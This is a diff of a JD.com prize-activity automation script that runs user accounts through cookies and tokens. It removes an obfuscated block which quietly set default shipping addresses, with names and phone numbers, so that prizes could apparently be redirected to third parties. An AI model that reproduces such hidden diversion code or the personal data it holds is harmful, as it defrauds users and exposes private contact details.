@@ -34,26 +34,28 @@ let lz_jdpin_token_cookie = ''
 let activityCookie = ''
 $.skipCk = process.env.WX_SKIP_PIN ? process.env.WX_SKIP_PIN : '';
 
-var __encode = 'jsjiami.com', _a = {}, _0xb483 = ["\x5F\x64\x65\x63\x6F\x64\x65", "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"]; (function (_0xd642x1) { _0xd642x1[_0xb483[0]] = _0xb483[1] })(_a); var __Oxe8c61 = ["\x69\x6E\x70\x75\x74\x41\x64\x64\x72\x65\x73\x73", "\x49\x4E\x50\x55\x54\x5F\x41\x44\x44\x52\x45\x53\x53", "\x65\x6E\x76", "", "\x61\x64\x64\x72\x65\x73\x73\x41\x72\x72\x61\x79", "\x3B", "\x73\x70\x6C\x69\x74", "\u4F60\u586B\u5199\u7684\u5730\u5740\u4E3A\x2D\x2D\x2D\x3E", "\x6C\x6F\x67", "\x70\x75\x73\x68", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5E02\u5357\u533A\x2C\u9999\u6E2F\u897F\u8DEF\x36\x39\u53F7\u5149\u5927\u56FD\u9645\u91D1\u878D\u4E2D\u5FC3\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x37\x31\x2C\x33\x37\x30\x32\x30\x32\x2C\u7530\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x31\x2C\x31\x39\x39\x36\x33\x32\x33\x36\x39\x35\x35\x2C\x32\x36\x36\x30\x34\x31\x2C\x33\x37\x30\x32\x31\x33\x2C\u7530\u8C46\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u5D02\u5C71\u533A\x2C\u6CC9\u5CAD\u8DEF\x38\u53F7\u4E2D\u5546\u56FD\u9645\u5927\u53A6\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x32\x2C\u5DE9\u5927\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x32\x2D\x33\x2D\x35\x30\x35\x2C\x31\x35\x32\x36\x35\x32\x39\x37\x39\x32\x36\x2C\x32\x36\x36\x31\x30\x30\x2C\x33\x37\x30\x32\x31\x33\x2C\u5DE9\u5C0F\u82B1", "\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u89E3\u653E\u8DEF\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\u7530\u751C\u8C46", "\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u674F\u575B\u4E1C\u533A\x36\x2D\x33\x2D\x35\x30\x35\x2C\x31\x33\x33\x39\x36\x33\x32\x33\x36\x38\x35\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\u5E38\u5C0F\u8C46", "\u5C71\u4E1C\u7701\x2C\u67A3\u5E84\u5E02\x2C\u6ED5\u5DDE\u5E02\x2C\u946B\u65FA\u8DEF\u5609\u5FB7\u57CE\u5E02\u82B1\u56ED\x2C\x31\x35\x31\x36\x33\x32\x34\x32\x35\x35\x32\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x34\x38\x31\x2C\u5F20\u8C46", "\u5C71\u4E1C\u7701\x2C\u9752\u5C9B\u5E02\x2C\u674E\u6CA7\u533A\x2C\u632F\u534E\u8DEF\x31\x34\x39\u53F7\x31\x2D\x33\x2D\x33\x30\x32\x2C\x31\x39\x35\x36\x30\x37\x30\x37\x39\x32\x36\x2C\x32\x37\x37\x35\x30\x30\x2C\x33\x37\x30\x32\x31\x33\x2C\x20\u7530\u4EAC\u90FD", "\x75\x6E\x64\x65\x66\x69\x6E\x65\x64", "\u5220\u9664", "\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A", "\u671F\u5F39\u7A97\uFF0C", "\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C", "\x6A\x73\x6A\x69\x61", "\x6D\x69\x2E\x63\x6F\x6D"]; $[__Oxe8c61[0x0]] = process[__Oxe8c61[0x2]][__Oxe8c61[0x1]] ? process[__Oxe8c61[0x2]][__Oxe8c61[0x1]] : __Oxe8c61[0x3]; $[__Oxe8c61[0x4]] = []; if ($[__Oxe8c61[0x0]] != __Oxe8c61[0x3]) { temp = $[__Oxe8c61[0x0]][__Oxe8c61[0x6]](__Oxe8c61[0x5]); console[__Oxe8c61[0x8]](`${__Oxe8c61[0x7]}`); for (let address of temp) { console[__Oxe8c61[0x8]](address); $[__Oxe8c61[0x4]][__Oxe8c61[0x9]](address) } } else { $[__Oxe8c61[0x4]] = [__Oxe8c61[0xa], __Oxe8c61[0xb], __Oxe8c61[0xc], __Oxe8c61[0xd], __Oxe8c61[0xe], __Oxe8c61[0xf], __Oxe8c61[0x10], __Oxe8c61[0x11]] };;; (function (_0x55c0x2, _0x55c0x3, _0x55c0x4, _0x55c0x5, _0x55c0x6, _0x55c0x7) { _0x55c0x7 = __Oxe8c61[0x12]; _0x55c0x5 = function (_0x55c0x8) { if (typeof alert !== _0x55c0x7) { alert(_0x55c0x8) }; if (typeof console !== _0x55c0x7) { console[__Oxe8c61[0x8]](_0x55c0x8) } }; _0x55c0x4 = function (_0x55c0x9, _0x55c0x2) { return _0x55c0x9 + _0x55c0x2 }; _0x55c0x6 = _0x55c0x4(__Oxe8c61[0x13], _0x55c0x4(_0x55c0x4(__Oxe8c61[0x14], __Oxe8c61[0x15]), __Oxe8c61[0x16])); try { _0x55c0x2 = __encode; if (!(typeof _0x55c0x2 !== _0x55c0x7 && _0x55c0x2 === _0x55c0x4(__Oxe8c61[0x17], __Oxe8c61[0x18]))) { _0x55c0x5(_0x55c0x6) } } catch (e) { _0x55c0x5(_0x55c0x6) } })({})
-
 const redis = require('redis');
 $.redisStatus = process.env.USE_REDIS ? process.env.USE_REDIS : false;
+$.redisUrl = process.env.REDIS_URL ? process.env.REDIS_URL : '';
 $.signUrl = process.env.JD_SIGN_URL ? process.env.JD_SIGN_URL : '';
-$.redisUrl = process.env.REDIS_URL ? process.env.REDIS_URL : "127.0.0.1:6379";
 if ($.signUrl == '') {
-    console.log(`请自行搭建sign接口，并设置环境变量-->\n  export JD_SIGN_URL="你的接口地址"`)
+    console.log(`🈳 请自行搭建sign接口，并设置环境变量-->\n  export JD_SIGN_URL="你的接口地址"`)
     return
 }
+
 let TokenKey = "TOKEN_KEY:"
 redisClient = null
 if ($.redisStatus) {
+    if ($.redisUrl == '') {
+        $.redisUrl = "127.0.0.1:6379"
+        console.log(`⚠️ Redis未配置，默认Redis为 127.0.0.1:6379 如需配置请设置-->\n  export REDIS_URL="你的REDIS地址"`)
+    }
     redisClient = redis.createClient({
         url: `redis://${$.redisUrl}`
     });
 } else {
-    console.log(`禁用Redis缓存Token，开启请设置环境变量-->\n  export USE_REDIS=true `)
+    console.log(`⚠️ 禁用Redis缓存Token，开启请设置环境变量-->\n  export USE_REDIS=true `)
 }
-$.cartKoiKey = `WuXian:CartKoiIds`
 
 if ($.isNode()) {
     Object.keys(jdCookieNode).forEach((item) => {
@@ -95,60 +97,6 @@ if ($.isNode()) {
         stop = false
         console.log("ID已存在，退出")
         return
-        //         for (let i = 0; i < cookiesArr.length; i++) {
-        //             if (cookiesArr[i]) {
-        //                 cookie = cookiesArr[i];
-        //                 if ($.skipCk != '') {
-        //                     if (cookie.indexOf($.skipCk) != -1) {
-        //                         continue
-        //                     }
-        //                 }
-
-        //                 $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
-        //                 $.key = TokenKey + cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1]
-        //                 $.index = i + 1;
-        //                 $.isLogin = true;
-        //                 $.nickName = '';
-        //                 console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
-        //                 if (!$.isLogin) {
-        //                     $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
-
-        //                     if ($.isNode()) {
-        //                         await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
-        //                     }
-        //                     continue
-        //                 }
-        //                 $.needRetry = false
-
-        //                 await jdmodule2();
-        //                 if ($.needRetry) {
-        //                     await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
-        //                     console.log(`----第一次重跑----`)
-        //                     await jdmodule2();
-        //                 }
-        //                 if ($.needRetry) {
-        //                     await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
-        //                     console.log(`----第二次重跑----`)
-        //                     await jdmodule2();
-        //                 }
-        //                 if ($.needRetry) {
-        //                     await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
-        //                     console.log(`----第三次重跑----`)
-        //                     await jdmodule2();
-        //                 }
-        //                 if ($.needRetry) {
-        //                     await $.wait(parseInt(Math.random() * 1000 + 5000, 10))
-        //                     console.log(`获取用户信息失败，跳过！`)
-        //                     continue
-        //                 }
-        //                 if (stop) {
-        //                     break
-        //                 }
-        //                 console.log(`休息一下别被403了`)
-        //                 await $.wait(parseInt(Math.random() * 5000 + 5000, 10))
-        //             }
-        //         }
-        //         await notify.sendNotify(`购物车锦鲤：${$.activityName}`, `${$.message}开奖时间：${$.drawTime}\n跳转链接: ${$.activityUrl}\n`);
     } else {
         for (let actInfo of $.activityIds.split("&")) {
             console.log(actInfo)
@@ -372,86 +320,6 @@ async function jdmodule(retry) {
     }
 }
 
-// async function jdmodule2() {
-//     activityCookie = '';
-//     $.Token = ''
-//     $.domain = $.activityUrl.match(/https?:\/\/([^/]+)/) && $.activityUrl.match(
-//         /https?:\/\/([^/]+)/)[1] || ''
-//     $.UA = `jdapp;iPhone;10.2.2;13.1.2;${uuid()};M/5.0;network/wifi;ADID/;model/iPhone8,1;addressid/2308460611;appBuild/167863;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1;`
-
-//     await getCK();
-//     console.log("lzToken=" + activityCookie)
-//     if ($.redisStatus) {
-//         $.Token = await redisClient.get($.key)
-//         if ($.Token == '' || $.Token == null) {
-//             console.log(`未找到缓存的Token，调用Sign接口`)
-//             await getSign($.domain)
-//             await takePostRequest("isvObfuscator");
-//             console.log('Token-->:' + $.Token)
-//         } else {
-//             console.log('缓存Token-->:' + $.Token)
-//         }
-//     } else {
-//         await getSign($.domain)
-//         await takePostRequest("isvObfuscator");
-//         console.log('Token-->:' + $.Token)
-//     }
-
-//     if ($.Token == '' || $.Token == null) {
-//         console.log(`获取Token失败`)
-//         $.needRetry = true
-//         return
-//     }
-
-//     await takePostRequest("getSimpleActInfoVo");
-
-//     await takePostRequest("getMyPing");
-
-//     await takePostRequest("accessLogWithAD")
-
-//     if ($.needRetry) {
-//         return
-//     }
-
-//     $.needRetry = false
-
-//     await takePostRequest("getUserInfo")
-
-//     await takePostRequest("activityContent")
-
-//     if ($.isGameEnd) {
-//         console.log(`活动已结束`)
-//         stop = true;
-//         return;
-//     }
-//     if ($.needFollow && !$.hasFollow) {
-//         console.log(`关注店铺`)
-//         await takePostRequest("followShop")
-//     }
-
-//     let curtimestamp = Date.parse(new Date());
-//     let prizeTime = timeToTimestamp($.drawTime) - curtimestamp
-//     if (prizeTime > 0) {
-//         if (prizeTime > 1000 * 60 * 10) {
-//             $.message += `购物车锦鲤开奖时间为${$.drawTime}`
-//             stop = true
-//             return
-//         } else {
-//             await $.wait(prizeTime)
-//             curtimestamp = Date.parse(new Date());
-//             prizeTime = timeToTimestamp($.drawTime) - curtimestamp
-//             if (prizeTime > 0) {
-//                 await $.wait(prizeTime)
-//                 curtimestamp = Date.parse(new Date());
-//                 prizeTime = timeToTimestamp($.drawTime) - curtimestamp
-//             }
-//         }
-
-//     }
-
-//     // 开始获取奖励
-//     await getPrize()
-// }
 
 //运行
 async function run() {
